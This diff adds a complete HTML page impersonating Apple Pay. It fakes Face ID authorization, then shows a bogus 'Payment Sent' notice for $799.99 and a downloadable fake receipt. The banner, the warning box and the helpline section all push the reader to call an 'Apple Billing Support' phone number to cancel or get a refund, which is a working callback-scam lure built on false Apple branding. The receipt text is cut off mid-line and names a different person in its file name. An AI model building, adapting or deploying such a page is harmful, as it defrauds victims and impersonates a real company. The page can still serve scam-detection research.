@@ -1,0 +1,229 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Apple Pay</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #000;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+    }
+
+    .banner {
+      background: #1c1c1e;
+      color: #fefefe;
+      width: 100%;
+      padding: 12px;
+      text-align: center;
+      font-size: 13px;
+      border-bottom: 1px solid #333;
+    }
+
+    .container {
+      background-color: #1c1c1e;
+      border-radius: 20px;
+      padding: 30px;
+      text-align: center;
+      width: 90%;
+      max-width: 360px;
+      margin-top: 20px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.5);
+      animation: fadeIn 1.2s ease-out;
+    }
+
+    .apple-logo {
+      width: 28px;
+      margin-bottom: 20px;
+    }
+
+    .amount {
+      font-size: 28px;
+      font-weight: 600;
+      margin: 10px 0;
+    }
+
+    .to {
+      font-size: 16px;
+      color: #aaa;
+    }
+
+    .processing {
+      margin-top: 30px;
+    }
+
+    .face-id-circle {
+      border: 3px solid #0a84ff;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      margin: 25px auto;
+      animation: pulse 1s ease-out infinite;
+    }
+
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(10,132,255, 0.5); }
+      70% { box-shadow: 0 0 0 12px rgba(10,132,255, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(10,132,255, 0); }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .checkmark {
+      font-size: 40px;
+      color: #32d74b;
+      display: none;
+    }
+
+    .confirmation {
+      display: none;
+      margin-top: 20px;
+      animation: fadeIn 1s ease-out;
+    }
+
+    .info {
+      font-size: 13px;
+      margin-top: 15px;
+      color: #ccc;
+    }
+
+    .warning {
+      background: #2c2c2e;
+      color: #fefefe;
+      padding: 15px;
+      margin-top: 20px;
+      border-radius: 12px;
+      font-size: 13px;
+      border-left: 4px solid #ff453a;
+      text-align: left;
+    }
+
+    .extra-info {
+      background: #2c2c2e;
+      color: #fefefe;
+      padding: 15px;
+      margin-top: 25px;
+      border-radius: 12px;
+      font-size: 13px;
+      border-left: 4px solid #0a84ff;
+      text-align: left;
+      animation: fadeIn 1.2s ease-out;
+    }
+
+    .download-btn {
+      margin-top: 20px;
+      background-color: #0a84ff;
+      border: none;
+      padding: 10px 20px;
+      color: white;
+      font-size: 14px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    footer {
+      color: #666;
+      font-size: 12px;
+      text-align: center;
+      padding: 20px 0;
+    }
+  </style>
+</head>
+<body>
+
+<div class="banner">
+  For payment questions, call Apple Billing Support: <strong>+1 (801) 457-2454 </strong>
+</div>
+
+<div class="container">
+  <img src="images/Apple_logo_black.svg" class="apple-logo" alt="Apple Logo">
+  <div class="to">Sending to <strong>DAVID WILSON</strong></div>
+  <div class="amount">$799.99</div>
+
+  <div class="processing" id="step1">
+    <div class="face-id-circle"></div>
+    <div>Authorizing with Face ID…</div>
+  </div>
+
+  <div class="checkmark" id="check">✅</div>
+
+  <div class="confirmation" id="confirm">
+    <h3>Payment Sent</h3>
+    <div class="info">Your payment to <strong>DAVID WILSON</strong> has been processed successfully using Apple Pay.</div>
+    <div class="info">Transaction ID: CHG-78345519</div>
+    <div class="info">Invoice ID: INV-22947811</div>
+    <div class="info">Status: Completed ✅</div>
+    <button class="download-btn" onclick="downloadReceipt()">📄 Download Receipt</button>
+
+    <div class="warning">
+      ⚠️ <strong>Note:</strong> This was an automated payment triggered by clicking a <em>Money Request Link</em>.<br><br>
+      If you did not intend this payment, contact Apple Billing Support:<br><strong>+1 (801) 457-2454 </strong>
+    </div>
+
+    <div class="extra-info">
+      <strong>Why this payment was made:</strong><br><br>
+      This payment was completed because you accepted a money request sent by <strong>DAVID WILSON</strong>.<br><br>
+      Once a money request is accepted on Apple Pay, the linked payment method is charged and the funds are automatically transferred to the requesting user.<br><br>
+      By proceeding, you confirmed the authorization for this payment, and it is now marked as <strong>Completed</strong> in your transaction history.<br><br>
+      <strong>Date:</strong> November 20, 2025<br>
+      <strong>Transaction ID:</strong> CHG-78345519<br>
+      <strong>Status:</strong> Completed ✅<br>
+      <strong>Payment Method:</strong> Linked Debit Card<br>
+      <strong>Confirmation:</strong> Email sent to your registered address<br><br>
+      💡 <em>This amount may take up to 24 hours to reflect on your bank statement.</em><br><br>
+      ⚠️ If you want to stop this payment or believe you are a victim of a scam, contact us immediately to report, cancel, and request a refund.<br><br>
+      <strong>Helpline:</strong> +1 (801) 457-2454 
+    </div>
+  </div>
+</div>
+
+<footer>© Apple Inc. 2025. All rights reserved.</footer>
+
+<script>
+  setTimeout(() => {
+    document.getElementById("step1").style.display = "none";
+    document.getElementById("check").style.display = "block";
+    setTimeout(() => {
+      document.getElementById("check").style.display = "none";
+      document.getElementById("confirm").style.display = "block";
+    }, 1200);
+  }, 2200);
+
+  function downloadReceipt() {
+    const content = `
+Apple Pay Receipt
+----------------------------
+Date: November 20, 2025
+
+Recipient: DAVID WILSON
+Amount: $799.99
+Status: Completed ✅
+
+Transaction ID: CHG-78345519
+Invoice ID: INV-22947811
+Payment Method: Apple Pay (Linked Card)
+Security: Face ID Authorized
+
+⚠️ This was an automated payment triggered by a Money Request Link.
+If unauthorized, contact Apple Billing Support: c
+    `.trim();
+
+    const blob = new Blob([content], { type: "text/plain" });
+    const a = document.createElement("a");
+    a.href = URL.createObjectURL(blob);
+    a.download = "ApplePay_Receipt_HarryWilson.txt";
+    a.click();
+  }
+</script>
+
+
+
+</body></html>
